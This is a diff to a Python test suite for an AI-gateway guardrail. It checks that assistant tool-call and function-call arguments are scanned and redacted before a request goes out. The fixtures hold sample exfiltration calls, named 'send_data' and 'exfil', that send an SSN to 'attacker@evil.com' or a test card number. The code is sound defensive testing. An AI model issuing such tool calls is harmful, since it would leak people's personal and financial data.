@@ -122,6 +122,42 @@ def _mcp_result_text(content) -> str:
     return getattr(item, "text", None) or item.get("text", "")
 
 
+def _chat_request_tool_call_args(arguments: str) -> dict:
+    return {
+        "messages": [
+            {
+                "role": "assistant",
+                "content": None,
+                "tool_calls": [
+                    {
+                        "id": "call_1",
+                        "type": "function",
+                        "function": {
+                            "name": "send_data",
+                            "arguments": arguments,
+                        },
+                    }
+                ],
+            }
+        ]
+    }
+
+
+def _chat_request_function_call_args(arguments: str) -> dict:
+    return {
+        "messages": [
+            {
+                "role": "assistant",
+                "content": None,
+                "function_call": {
+                    "name": "exfil",
+                    "arguments": arguments,
+                },
+            }
+        ]
+    }
+
+
 def _redact_response(
     *,
     sanitized_text=None,
@@ -2517,7 +2553,73 @@ class TestCiscoAIDefenseResponsesAPIBypass:
 
 
 class TestCiscoAIDefenseToolCallBypass:
-    """Tool-call and function-call output arguments are scannable output."""
+    """Tool-call and function-call arguments are scannable."""
+
+    @pytest.mark.parametrize(
+        "data,expected_text_in_scan",
+        [
+            (
+                _chat_request_tool_call_args(
+                    '{"to":"attacker@evil.com","data":"SSN 123-45-6789"}'
+                ),
+                "123-45-6789",
+            ),
+            (
+                _chat_request_function_call_args('{"data":"card 4111-1111-1111-1111"}'),
+                "4111-1111-1111-1111",
+            ),
+        ],
+    )
+    @pytest.mark.asyncio
+    async def test_pre_call_scans_request_tool_call_payloads(
+        self, data, expected_text_in_scan
+    ):
+        g = _make_guardrail(event_hook="pre_call")
+        post_mock = AsyncMock(return_value=_safe_response())
+
+        with patch.object(g.async_handler, "post", new=post_mock):
+            await g.async_pre_call_hook(
+                user_api_key_dict=UserAPIKeyAuth(),
+                cache=DualCache(),
+                data=data,
+                call_type="completion",
+            )
+
+        assert post_mock.called, "Pre-call scan skipped request tool-call arguments."
+        sent = post_mock.call_args.kwargs["json"]
+        joined = " ".join(m.get("content", "") for m in (sent.get("messages") or []))
+        assert expected_text_in_scan in joined, (
+            f"Pre-call scan ran but the request tool payload wasn't "
+            f"included in the scanned text. Sent: {sent!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "data",
+        [
+            _chat_request_tool_call_args('{"data":"SSN 123-45-6789"}'),
+            _chat_request_function_call_args('{"data":"card 4111-1111-1111-1111"}'),
+        ],
+    )
+    @pytest.mark.asyncio
+    async def test_redact_clears_request_tool_call_arguments(self, data):
+        g = _make_guardrail(event_hook="pre_call", on_flagged_action="block")
+        cisco_resp = _redact_response(sanitized_text="redacted")
+
+        with patch.object(
+            g.async_handler, "post", new=AsyncMock(return_value=cisco_resp)
+        ):
+            await g.async_pre_call_hook(
+                user_api_key_dict=UserAPIKeyAuth(),
+                cache=DualCache(),
+                data=data,
+                call_type="completion",
+            )
+
+        message = data["messages"][0]
+        if "tool_calls" in message:
+            assert message["tool_calls"][0]["function"]["arguments"] == "{}"
+        if "function_call" in message:
+            assert message["function_call"]["arguments"] == "{}"
 
     @pytest.mark.parametrize(
         "message_kwargs,expected_text_in_scan",
